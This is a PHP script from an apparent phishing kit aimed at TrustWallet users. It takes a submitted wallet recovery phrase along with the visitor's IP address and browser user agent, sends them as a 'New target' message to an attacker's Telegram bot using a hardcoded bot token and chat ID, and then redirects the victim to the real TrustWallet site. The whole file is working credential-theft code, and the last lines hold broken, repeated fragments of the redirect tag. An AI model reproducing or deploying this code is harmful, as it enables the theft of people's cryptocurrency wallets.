<?php 
$ID = "1084464501"; //آیدی عددیت
$TOKEN = "6038458787:AAGr1iHRdvfthezaLKQgfb56xUSUJ5ZEhuk"; //توکن





$brows= $_SERVER['HTTP_USER_AGENT'];
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ip = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {    	
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ip = $_SERVER['REMOTE_ADDR']."\r\n";
    };
//-------------------------------------------------//
$phrase= $_POST['phrase'];
//-------------------------------------------------//
$massage = "💢 New target
🔰〰️〰️〰️〰️〰️〰️〰️〰️🔰
▫️Account :  TrustWallet

◾️IP Target : [$ip]

◽️Target Agent User : [$brows]

◼️HASH : [$phrase]
🔲〰️〰️〰️〰️〰️〰️〰️〰️🔲
🔔 erfan [ @AMIR_HACK ]";
//----------------SENDTel---------------------------------//
@$get = file_get_contents("https://api.telegram.org/bot$TOKEN/SendMessage?pars_mode=html&chat_id=$ID&text=".urlencode($massage));
//---------------------------SENDSHELL----------------------//
?>
 <meta content='0;url=https://TrustWallet.com<?php ?>' http-equiv='refresh'/>
ustWallet.com<?php ?>' http-equiv='refresh'/>
sh'/>

